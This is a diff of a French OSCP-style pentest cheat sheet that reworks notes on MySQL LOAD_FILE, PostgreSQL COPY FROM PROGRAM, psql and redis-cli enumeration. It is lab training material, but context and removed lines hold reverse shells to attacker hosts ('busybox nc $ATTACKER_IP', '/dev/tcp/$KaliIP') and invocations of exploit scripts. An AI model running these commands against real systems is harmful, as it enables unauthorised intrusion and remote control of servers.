@@ -2312,20 +2312,16 @@ SHOW GRANTS FOR CURRENT_USER;
 
 ```
 
+<p class="oscp-command-note">MySQL : LOAD_FILE lit un fichier sur le serveur SQL, pas sur Kali ; nécessite les droits FILE et une configuration secure_file_priv compatible.</p>
+
 ```sql
--- LOAD_FILE lit un fichier côté serveur si les droits FILE et secure_file_priv le permettent
 SELECT LOAD_FILE('C:/xampp/htdocs/ncat.exe');
+```
 
-# Windows CMD, hors du client SQL : consulter les ACL d'un fichier existant
-icacls "C:\\xampp\\htdocs\\ncat.exe"
+<p class="oscp-command-note">Windows CMD ou PowerShell sur l'hôte Windows concerné : examiner séparément les permissions NTFS du fichier, si le chemin existe.</p>
 
-# Exemple de sortie ACL Windows : les droits affichés ne prouvent pas que le compte SQL est administrateur.
-nc.exe WinServer\\apache:(I)(F)  
-    NT AUTHORITY\\SYSTEM:(I)(F)  
-    BUILTIN\\Administrators:(I)(F)  
-    BUILTIN\\Users:(I)(RX)  
-Successfully processed 1 files; Failed processing 0 files
-
+```cmd
+icacls "C:\xampp\htdocs\ncat.exe"
 ```
 
 ### 3389: RDP
@@ -2426,7 +2422,7 @@ python3 50847.py -i <ip> -p 5437 -c "busybox nc $ATTACKER_IP 80 -e sh"
 
 ```
 
-<p class="oscp-command-note">PostgreSQL : démonstration de COPY FROM PROGRAM, réservée aux rôles disposant des privilèges requis.</p>
+<p class="oscp-command-note">PostgreSQL : COPY FROM PROGRAM exécute `id` sur le serveur sous le compte du service PostgreSQL, uniquement avec les droits superutilisateur ou `pg_execute_server_program`. Cette démonstration crée puis supprime une table : laboratoire uniquement.</p>
 
 ```sql
 -- Démonstration SQL PostgreSQL : COPY FROM PROGRAM exige des privilèges élevés  
@@ -2436,35 +2432,19 @@ COPY cmd_exec FROM PROGRAM 'id';
 SELECT * FROM cmd_exec;  
 DROP TABLE IF EXISTS cmd_exec;
 
--- Exemple historique de shell inversé : ne pas confondre SQL et commande système
-DROP TABLE IF EXISTS cmd_exec;  
-CREATE TABLE cmd_exec(cmd_output text);
-COPY cmd_exec FROM PROGRAM 'sh -i >& /dev/tcp/$KaliIP/8080 0>&1';
-SELECT * FROM cmd_exec;  
-DROP TABLE IF EXISTS cmd_exec;
-
 ```
 
 <p class="oscp-command-note">Dans psql : les méta-commandes commencent par une barre oblique inverse ; exécuter les requêtes SQL séparément.</p>
 
+Dans l'invite `psql`, exécuter les lignes suivantes individuellement : `\l` liste les bases, `\c` change de base, `\dt` liste les tables et `\d` décrit une table. Remplacer les noms entre chevrons.
+
 ```text
-# Méta-commandes psql : saisir uniquement les lignes commençant par \
 \l
-
 \c postgres
-
-# Changer de base de données (remplacer le nom)
 \c <DB_NAME>
-
-# Lister les tables visibles du schéma courant
 \dt
-
-# Afficher les colonnes et les types d'une table
 \d <TABLE_NAME>
-
-# Afficher les colonnes, types et informations supplémentaires d'une table
 \d+ <TABLE_NAME>
-
 ```
 
 <p class="oscp-command-note">Dans psql : requêtes SQL de lecture et modifications de données de démonstration, à exécuter séparément des méta-commandes.</p>
@@ -2625,26 +2605,27 @@ python3 redis-rce-exploit.py -h <ip> -p 6379 -c "payload"
 
 ```
 
-<p class="oscp-command-note">Redis : distinguer la commande Linux redis-cli des commandes INFO, SCAN et GET saisies ensuite dans son invite.</p>
+<p class="oscp-command-note">Sur Kali : démarrer le client Redis. Une authentification peut être nécessaire.</p>
+
+```bash
+redis-cli -h <IP_CIBLE> -p 6379
+```
+
+<p class="oscp-command-note">Dans l'invite `redis-cli` : `INFO` affiche les informations autorisées ; répéter `SCAN` avec le curseur renvoyé jusqu'à zéro. `SELECT 0` choisit la base 0 ; `CONFIG GET` dépend des ACL. `SET` modifie les données : laboratoire uniquement. Ne pas exécuter `SHUTDOWN`.</p>
 
 ```text
-# Terminal Kali : démarrer redis-cli ; la connexion peut demander une authentification
-redis-cli -h <IP_CIBLE> -p 6379
+INFO
+SCAN 0
+SELECT 0
+GET mykey
+CONFIG GET '*'
+```
 
-# Dans redis-cli : INFO décrit le serveur ; répéter SCAN avec le curseur retourné jusqu'à 0
-info
-scan 0
-# Dans redis-cli : sélectionner la base 0
-select 0
+<p class="oscp-command-note">Écriture facultative, uniquement sur une base de test :</p>
 
-# Dans redis-cli : SET crée ou écrase une clé ; réserver cette modification à une base de laboratoire
-set mykey myvalue
-get mykey
-
-# Dans redis-cli : CONFIG GET affiche uniquement les paramètres autorisés par les ACL
-config get '*'
-# Ne pas lancer SHUTDOWN : cette commande arrête le serveur Redis.
-
+```text
+SET mykey myvalue
+GET mykey
 ```
 
 ### Port inconnu
